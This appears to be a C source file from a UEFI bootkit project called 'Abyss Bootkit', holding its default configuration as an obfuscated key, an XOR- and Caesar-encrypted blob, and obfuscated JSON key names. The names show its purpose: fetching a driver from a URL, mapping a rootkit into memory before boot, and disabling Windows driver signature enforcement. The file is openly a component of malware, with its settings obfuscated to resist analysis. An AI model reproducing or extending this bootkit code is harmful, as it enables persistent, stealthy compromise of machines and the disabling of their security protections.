// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Default Encrypted Configuration
**/



// START -> PAYLOADS --------------------------------------------------------------------------------------------------------------------------
// START -> PAYLOADS --------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Payloads/Payloads00DefaultEncryptedConfiguration.h>



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



/**
	Go to Abyss Bootkit Configuration Tool
		cd AbyssBootkitPkg/Tool_BootkitConfiguration

	Run script
		python AbyssConfiguration.py

	Copy and paste the output into this file
**/



// Decrypt
const UINTN Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyKeySize = 32;
const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyXorKey = 0x1c;
const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyPermutation[32] = {0, 4, 27, 5, 20, 18, 7, 13, 14, 22, 12, 25, 19, 6, 10, 15, 16, 11, 23, 3, 17, 24, 8, 21, 31, 29, 28, 1, 30, 26, 9, 2};
const UINT8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_KeyObfuscatedKey[32] = {0xd9, 0xa6, 0x1f, 0x95, 0xcf, 0x56, 0xc4, 0x5d, 0xc3, 0x5e, 0x51, 0x0e, 0x83, 0xe0, 0xad, 0x51, 0xc3, 0x9b, 0x22, 0xe5, 0xcb, 0xd7, 0x74, 0x5a, 0xfc, 0x47, 0xf5, 0x82, 0xcd, 0x0f, 0x78, 0xba};
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationXorKey = 0x6c;
const INTN Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationCaesarShift = 4;
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_ConfigurationEncryptedConfiguration[] = "GSsSPgcFXScyPgpLGkIxHGAeBzIyPiRBQkBBQQ4zLkdhQioHKS06Xl4dPQYzExMxJWAxH14uLV8RYWBLGC9jCUIfR18hXS1dHgs8XCpYGSZLOgwTGgpCWDJhXQgeBxNgBgYFLSkiHB8dX1kfQEAHOBFBWD8LXV0yIgxgYDE4Gjo/GAUrYjMRYwULLR9fXEM6HgxcPEIKHCwtHEIvXxwOXTksKxhiKgsRMyhdI2JZQllhQSAfEV0SEQpiMhMzEjwLX0sFWF0oEjIpGBk+J1hjOEJCLmITK1wEBzwFPR8/WCVeYjIRD0IpQUtgXQc/P2NdXgRAXiEFDjxBHEAEYjkGJkdCPg4NOC4qIAsdSzwlXiFYQxwNBxkhERo6GisHSy0/KCItHy4kXUcdExpDGQ1DJAkeKmI+OT0ZK2M+WS5dHgsZGDkRHAkGJDMSGSoFXiYTGVwHMwURWSQ+IyAYYVkHXQ4GMj4oKCwFLwUuKTgYIRliSzhiDRoPBy0iJCkuXl0sDxMoHwo6IGI8HQQFPUc6JCYdPTEoPEMmGCMIMSQFOiYRLkE9WEMYWV4SCQkTPRIsGGJjDRIhLywrGBoeBA8vXAckXzkyEw4NJjkiLkEmJzlBLx8hLz4LCi4uMkIIMQYgLysRYmNZDg4kHSc/MkMmJAckQA0dOFksEhg8KR8HXSwgSw0ODTguPiomXFheLxw5PSgEJz5cYT1CDhxDPTpAXQRfWWMcGEAMOSkHYCxhGA4kWThjLA4nLlkcEj0KEh84KjMKGCQ4MywZGUIFRwQPYgU4J14aR2IGEiMoIgk4LwxcXyERBwxHER06EwkRJzwzDiYoGFgZJiY4Sw8sEgcIKx8IXh1LYDpHQwkgK0IFYR9ABiZjISsxQyURXkE+OiseQB5AKhw8Jw8qEx4JD2EkIDpCQhMjQy8KJDMFMSEGWRM4DylcIF8aPCxLCS9DQRo5HgZgXh0RClwOJw4KX1kSXzIKCAQvGCoFJz8LQSgPWSUZYDEhKCNDXiQaGj5iJAoYXRIkElhdGioYLBEZXUEyPVkyHg1LPUEnPSE+DCkyMhhAXgQRBTpiBg8fJSAuQy0/J2AyRwc/WQUSJRkHCThBYEAuByAdR2JYXwRZIkMYImMRP1w5KC9HHF8oJF8HExpfBBgvSzwTKCs5Ih8PHDERHgtjIwgLWRIMBi8pXDE/KWFeLks6MwgeGmIOLFlgHzghGUEtSz8eCT0LYSoiY0coPD4ODRhHXzxgQToZQUsvOgo+OSNLXBEtLywhBUFZLitf";
// Json Keys
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_Screen[] = "Hf3!FcN.w3iXEL<";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_Banner[] = "?lq>sdUop;t";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerImageAbyssSquid[] = "tFG,&Z1snc4MWn,vZOy|iZV&ICbQ";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerImageSquid[] = "RLo0Lo-Fz";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BannerAscii[] = "OXO2t";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriver[] = ">xAT1vR,";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverDownload[] = "m6OAgaw$Gzi.9:JKPsxM66v$Bu";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverURL[] = "BA-rNhbQg@XXU";      
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_UEFIReadWriteNTFSDriverPath[] = "WeI5CcA<Yco<oqqr0fg@aTf";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_AdditionalComponent[] = "GZ63mTs!3nt|ZIzu48icfz-N";  
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_AdditionalComponentPath[] = "1Hw#a1Bdo5&Ljn>@@buliomdsrRwG$";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitRuntime[] = ";1PGJEH1BA2RWnVluMD";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitRuntimePath[] = "#whh9B?KuBRgJBeRu5ZGA8X0g-_";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBoot[] = "2nVIUVkv9-dbJO_nHc";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBootMapRootkitToMemory[] = "T4?PTp@4N-3iIMhw5FduwcV;Xw;I$#";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_BootkitBootMapRootkitToMemoryModule[] = "F&@p+?|3|ct>mh";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_DisableProtections[] = "WWI?!0+";
const CHAR8 Global_PreBootConfiguration_PayloadsEncryptedConfiguration_DisableProtectionsDSE[] = "f8Y$EkdAp&NRMC>!XOf>6!P";



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
